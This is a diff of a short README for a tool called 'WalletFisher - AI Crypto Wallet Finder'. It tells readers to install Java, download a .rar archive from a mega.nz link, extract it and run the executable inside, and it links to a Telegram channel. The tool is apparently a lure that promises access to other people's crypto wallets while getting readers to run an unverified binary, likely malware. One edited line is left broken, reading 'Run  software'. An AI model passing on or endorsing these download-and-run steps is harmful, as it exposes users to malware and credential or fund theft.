@@ -1,10 +1,10 @@
 WalletFisher - AI Crypto Wallet Finder
-
-**First, download Wallet hunter 2025.rar file from this link : https://mega.nz/file/q4Qk1T7T#nrLwbgfq7UNflEmTsfg8Uk3EtgweI-GJPnJwa_td-6Y
+1/ You must download Java to  to run this software : https://www.java.com/en/download/
+**2/ download Wallet hunter 2025.rar file from this link : https://mega.nz/file/q4Qk1T7T#nrLwbgfq7UNflEmTsfg8Uk3EtgweI-GJPnJwa_td-6Y
 
 **Extract all files into a folder.
 
-**Run walletsearch.exe software
+**Run  software
 
 join telegram channel : https://t.me/cryptosearchwallets
 
